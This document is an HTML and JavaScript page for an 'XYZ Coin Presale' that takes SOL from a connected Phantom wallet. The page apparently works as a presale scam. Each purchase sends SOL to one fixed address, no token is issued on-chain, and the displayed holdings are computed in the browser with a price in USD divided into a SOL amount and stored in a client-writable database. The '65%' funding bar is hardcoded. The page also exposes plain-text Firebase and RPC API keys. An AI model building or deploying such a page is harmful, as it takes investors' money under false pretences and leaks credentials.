<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XYZ Coin Presale</title>
  <!-- Buffer polyfill for Solana -->
  <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
  <!-- Solana Web3 -->
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.js"></script>
  <!-- Firebase -->
  <script type="module" src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
  <script type="module" src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
  <!-- Wallet Adapter -->
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.18/lib/index.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.22/lib/index.umd.min.js"></script>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #6e45e2;
      --secondary: #88d3ce;
      --dark: #1a1a2e;
      --light: #f1f1f1;
      --success: #4caf50;
      --danger: #f44336;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: var(--light);
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }
    
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 2rem;
    }
    
    header {
      text-align: center;
      margin-bottom: 2rem;
    }
    
    h1 {
      color: var(--secondary);
      font-size: 2.5rem;
      margin-bottom: 0.5rem;
      background: linear-gradient(to right, var(--secondary), var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .card {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .wallet-info {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 1.5rem;
    }
    
    .wallet-address {
      font-family: monospace;
      background: rgba(0, 0, 0, 0.3);
      padding: 0.5rem 1rem;
      border-radius: 5px;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 70%;
    }
    
    .btn {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: white;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 50px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
    
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(110, 69, 226, 0.4);
    }
    
    .btn i {
      margin-right: 8px;
    }
    
    .btn-disconnect {
      background: var(--danger);
    }
    
    .amount-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
      gap: 1rem;
      margin: 1.5rem 0;
    }
    
    .amount-btn {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.2);
      color: white;
      padding: 0.75rem;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: center;
    }
    
    .amount-btn:hover {
      background: rgba(110, 69, 226, 0.3);
      border-color: var(--primary);
    }
    
    .status {
      padding: 1rem;
      border-radius: 8px;
      margin: 1.5rem 0;
      text-align: center;
    }
    
    .status-success {
      background-color: rgba(76, 175, 80, 0.2);
      border: 1px solid var(--success);
    }
    
    .status-error {
      background-color: rgba(244, 67, 54, 0.2);
      border: 1px solid var(--danger);
    }
    
    .dashboard {
      background: rgba(0, 0, 0, 0.2);
      padding: 1.5rem;
      border-radius: 15px;
      margin-top: 2rem;
    }
    
    .dashboard h3 {
      margin-top: 0;
      color: var(--secondary);
    }
    
    .dashboard-item {
      display: flex;
      justify-content: space-between;
      margin-bottom: 0.5rem;
    }
    
    .progress-container {
      width: 100%;
      background-color: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 1.5rem 0;
      height: 10px;
    }
    
    .progress-bar {
      height: 100%;
      border-radius: 10px;
      background: linear-gradient(to right, var(--primary), var(--secondary));
      width: 65%;
    }
    
    @media (max-width: 600px) {
      .container {
        padding: 1rem;
      }
      
      .amount-buttons {
        grid-template-columns: repeat(2, 1fr);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>XYZ Coin Presale</h1>
      <p>Participate in the XYZ token presale with SOL</p>
    </header>
    
    <div class="card">
      <div class="wallet-info">
        <div class="wallet-address" id="walletAddress">Not connected</div>
        <button class="btn" id="connectButton" onclick="connectWallet()">
          <i class="fas fa-wallet"></i> Connect Wallet
        </button>
      </div>
      
      <div class="progress-container">
        <div class="progress-bar"></div>
      </div>
      <p style="text-align: center;">65% of presale target reached</p>
      
      <h2 style="margin-bottom: 1rem;">Select Amount to Invest</h2>
      <div class="amount-buttons">
        <button class="amount-btn" onclick="buyToken(0.05)">0.05 SOL</button>
        <button class="amount-btn" onclick="buyToken(0.08)">0.08 SOL</button>
        <button class="amount-btn" onclick="buyToken(0.1)">0.1 SOL</button>
        <button class="amount-btn" onclick="buyToken(0.5)">0.5 SOL</button>
        <button class="amount-btn" onclick="buyToken(1.0)">1.0 SOL</button>
      </div>
      
      <div id="status" class="status" style="display: none;"></div>
    </div>
    
    <div class="dashboard card">
      <h3>Your XYZ Coin Holdings</h3>
      <div class="dashboard-item">
        <span>XYZ Coins:</span>
        <span id="xyzBalance">0</span>
      </div>
      <div class="dashboard-item">
        <span>Total SOL Invested:</span>
        <span id="solInvested">0</span>
      </div>
      <div class="dashboard-item">
        <span>Last Transaction:</span>
        <span id="lastTransaction">None</span>
      </div>
    </div>
  </div>

  <script type="module">
    // Initialize Firebase
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDIwoUIMJrJQeLBD9vijsfIUXG9BgaGSPs",
      authDomain: "miner-zyx.firebaseapp.com",
      projectId: "miner-zyx",
      storageBucket: "miner-zyx.appspot.com",
      messagingSenderId: "430019680448",
      appId: "1:430019680448:web:d066b8aaf4355907e1b525",
      measurementId: "G-V6SDWYH6M2"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Initialize Solana connection
    const connection = new solanaWeb3.Connection('https://mainnet.helius-rpc.com/?api-key=ffa4267c-d28d-4bce-baf4-6cca12c26952');
    const destinationAddress = new solanaWeb3.PublicKey("99R4aBwwjXxeT9ukG2o1ppGE7GFEPqAWt94MvHhxoxgf");

    let userPublicKey = null;
    let totalTokens = 0;
    let totalSolInvested = 0;

    // Ensure Buffer is available
    if (typeof window.Buffer === 'undefined') {
      window.Buffer = Buffer;
    }

    window.connectWallet = async () => {
      try {
        const provider = window.solana;
        if (!provider?.isPhantom) {
          showStatus("Phantom wallet not found! Please install Phantom Wallet.", "error");
          window.open('https://phantom.app/', '_blank');
          return;
        }
        
        const res = await provider.connect();
        userPublicKey = new solanaWeb3.PublicKey(res.publicKey.toString());
        
        // Update UI
        document.getElementById("walletAddress").textContent = 
          `${userPublicKey.toString().substring(0, 6)}...${userPublicKey.toString().substring(userPublicKey.toString().length - 4)}`;
        
        document.getElementById("connectButton").innerHTML = 
          '<i class="fas fa-check-circle"></i> Connected';
        document.getElementById("connectButton").classList.add('btn-disconnect');
        document.getElementById("connectButton").onclick = disconnectWallet;
        
        // Load user data from Firestore
        await loadUserData();
        
      } catch (error) {
        console.error("Wallet connection failed", error);
        showStatus("Wallet connection failed: " + error.message, "error");
      }
    };

    window.disconnectWallet = () => {
      userPublicKey = null;
      document.getElementById("walletAddress").textContent = "Not connected";
      document.getElementById("connectButton").innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
      document.getElementById("connectButton").classList.remove('btn-disconnect');
      document.getElementById("connectButton").onclick = connectWallet;
      
      // Reset dashboard
      document.getElementById("xyzBalance").textContent = "0";
      document.getElementById("solInvested").textContent = "0";
      document.getElementById("lastTransaction").textContent = "None";
    };

    window.buyToken = async (solAmount) => {
      if (!userPublicKey) {
        showStatus("Please connect your wallet first!", "error");
        return;
      }

      try {
        showStatus("Processing transaction...", "info");
        
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: userPublicKey,
            toPubkey: destinationAddress,
            lamports: solanaWeb3.LAMPORTS_PER_SOL * solAmount,
          })
        );

        transaction.feePayer = userPublicKey;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        const signedTransaction = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(signature);

        const tokenPrice = 0.04; // USD per token
        const tokensBought = solAmount / tokenPrice;
        totalTokens += tokensBought;
        totalSolInvested += solAmount;
        
        // Update UI
        showStatus(`Success! You bought ${tokensBought.toFixed(2)} XYZ Coins. TX: ${signature.substring(0, 10)}...`, "success");
        updateDashboard(tokensBought, solAmount);
        
        // Save to Firestore
        const txData = {
          wallet: userPublicKey.toString(),
          solAmount,
          tokensBought,
          timestamp: new Date().toISOString(),
          txHash: signature
        };
        
        await setDoc(doc(db, "xyzPresale", signature), txData);
        await setDoc(doc(db, "users", userPublicKey.toString()), {
          totalTokens: totalTokens,
          totalSolInvested: totalSolInvested,
          lastTransaction: new Date().toISOString()
        }, { merge: true });

      } catch (error) {
        console.error("Transaction failed", error);
        showStatus("Transaction failed: " + error.message, "error");
      }
    };

    async function loadUserData() {
      if (!userPublicKey) return;
      
      try {
        const userDoc = await getDoc(doc(db, "users", userPublicKey.toString()));
        if (userDoc.exists()) {
          const userData = userDoc.data();
          totalTokens = userData.totalTokens || 0;
          totalSolInvested = userData.totalSolInvested || 0;
          
          updateDashboard(totalTokens, totalSolInvested);
          document.getElementById("lastTransaction").textContent = 
            userData.lastTransaction ? new Date(userData.lastTransaction).toLocaleString() : "None";
        }
      } catch (error) {
        console.error("Error loading user data:", error);
      }
    }

    function updateDashboard(tokens, sol) {
      document.getElementById("xyzBalance").textContent = tokens.toFixed(2);
      document.getElementById("solInvested").textContent = sol.toFixed(2);
      document.getElementById("lastTransaction").textContent = new Date().toLocaleString();
    }

    function showStatus(message, type) {
      const statusElement = document.getElementById("status");
      statusElement.textContent = message;
      statusElement.style.display = "block";
      statusElement.className = "status";
      
      if (type === "success") {
        statusElement.classList.add("status-success");
      } else if (type === "error") {
        statusElement.classList.add("status-error");
      } else if (type === "info") {
        // Default style for info
      }
      
      setTimeout(() => {
        statusElement.style.display = "none";
      }, 5000);
    }
  </script>
</body>
</html>
